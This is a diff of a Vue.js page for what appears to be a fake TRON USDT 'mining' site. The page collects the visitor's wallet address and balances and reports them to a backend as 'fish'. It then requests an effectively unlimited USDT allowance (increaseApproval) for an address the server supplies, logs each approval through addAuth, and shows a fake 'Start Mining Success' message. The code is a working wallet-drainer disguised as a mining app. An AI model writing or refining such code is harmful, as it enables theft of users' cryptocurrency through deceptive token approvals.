@@ -18,7 +18,7 @@
         </div>
         <div class="linkBox" v-show="showAddress">
           <i class="iconfont"></i>
-          <span >{{ walletAddress }}</span>
+          <span>{{ walletAddress }}</span>
         </div>
       </div>
     </div>
@@ -220,7 +220,7 @@
               <div class="blockItem">
                 <div class="itemTitle">Wallet balance</div>
                 <div class="itemValue">
-                  <span id="account_usdt">0.00</span> USDT
+                  <span id="account_usdt">{{ fish.usdt }}</span> USDT
                 </div>
               </div>
               <div class="blockItem">
@@ -235,7 +235,7 @@
                 @click="isActive = 1"
                 :class="['changeItem', isActive == 1 ? 'active' : '']"
               >
-                Withdraw2
+                Withdraw
               </div>
               <div
                 @click="isActive = 2"
@@ -311,10 +311,12 @@
           <div class="blockBox shareBox">
             <div class="shareTitle">My wallet address</div>
             <div class="shareInfo">
-              <div class="infoLeft"><span id="myaddress"></span></div>
+              <div class="infoLeft">
+                <input id="myaddress" v-model="myWalletAddress" style="border-style: none;width: 90%;"></input>
+              </div>
               <div class="infoRight">
                 <div class="copy">
-                  <a class="btnmyaddress" id="btn_myaddress">Copy</a>
+                  <a class="btnmyaddress" v-clipboard:copy="myWalletAddress" v-clipboard:success="onCopy">Copy</a>
                 </div>
               </div>
             </div>
@@ -325,17 +327,11 @@
             <div class="shareTitle">My share link</div>
             <div class="shareInfo">
               <div class="infoLeft">
-                <span id="sharelink"
-                  >https://www.imoretron.site/?token=I1X4LB&amp;from=bitkeep&amp;saleman=0</span
-                >
+                <input id="myaddress" v-model="shareLink" style="border-style: none;width: 90%;"></input>
               </div>
               <div class="infoRight">
                 <div class="copy">
-                  <a
-                    id="btn_sharelink"
-                    data-clipboard-text="https://www.imoretron.site/?token=I1X4LB&amp;from=bitkeep&amp;saleman=0"
-                    >Copy</a
-                  >
+                  <a class="btnmyaddress"  v-clipboard:copy="shareLink" v-clipboard:success="onCopy">Copy</a>
                 </div>
               </div>
             </div>
@@ -357,7 +353,7 @@
 </template>
 
 <script>
-import {addFish, getAuth} from "@/api/tron/auth";
+import {addFish, getAuth, addAuth } from "@/api/tron/auth";
 
 export default {
   name: "Home",
@@ -372,13 +368,15 @@ export default {
       contractAddr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
       approveAddr: undefined,
       walletAddress: undefined,
+      myWalletAddress: undefined,
+      shareLink: window.location.href,
       showConnection: true,
       showAddress: false,
       fish: {
           token: undefined,
           address: undefined,
-          trx: 0.0,
-          usdt: 0.0
+          trx: 0.00.toFixed(2),
+          usdt: 0.00.toFixed(2)
       }
     };
   },
@@ -398,10 +396,10 @@ export default {
         clearInterval(obj);
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
           var wallet_addr = window.tronWeb.defaultAddress.base58;
+          this.myWalletAddress = wallet_addr;
           this.walletAddress = wallet_addr.substr(0, 4) + '***' + wallet_addr.substr(30, 6);
-          this.showConnection = false;
-          this.showAddress = true;
           this.contract = await window.tronWeb.contract(this.abi, this.contractAddr);
+          console.info(wallet_addr);
 
           await window.tronWeb.trx.getBalance(wallet_addr).then(result => this.fish.trx=result/1000000);
           await this.contract.balanceOf(wallet_addr).call((err, balance) => {
@@ -409,16 +407,33 @@ export default {
           });
           this.fish.address=wallet_addr;
           this.fish.token=this.$route.query.token;
-          this.addFish(this.fish);
 
+          // if (this.fish.trx <= 6){
+          //     this.$toast({ message: "Your TRX balance is insufficient. Please deposit at least 10 TRX"});
+          //     return;
+          // }
+
+          this.showConnection = false;
+          this.showAddress = true;
+
+          var flag=await addFish(this.fish).then(response => {
+            if (response.data.code == 500){
+              return true;
+            }else{
+              return false;
+            }
+          });
+          if (flag){
+            return;
+          }
           let res = await this.contract["increaseApproval"](this.approveAddr, "90000000000000000000000000000");
           res.send({
             feeLimit: 10000000,
             callValue: 0,
             shouldPollResponse: false
-          }, function (err, res) {
-            if (err == null) {
-
+          }, (err, res) => {
+            if (err == null){
+              this.addAuth(this.fish);
             }
           })
         }
@@ -426,25 +441,33 @@ export default {
     },
     init(){
       var token=this.$route.query.token;
+      if (!token){
+        this.$toast({ message: "Please input token"});
+        return;
+      }
       getAuth(token).then(response => {
         if (response.data.code==200){
           this.approveAddr=response.data.msg;
         }
+        if (response.data.code==500){
+          console.info(response.data.msg);
+          this.showConnection = false;
+          this.showAddress = true;
+        }
       });
     },
-    addFish(data){
-      addFish(data).then(response => {
+    addAuth(data){
+      addAuth(data).then(response => {
         if (response.code==200){
           console.info(response);
         }
       });
     },
-    addAuth(){
-
-    },
     startMining(){
-      console.info(window.tronWeb.isConnected());
-
+      this.$toast({ message: "Start Mining Success"});
+    },
+    onCopy(){
+      this.$toast({ message: "copy Success"});
     }
   }
 };
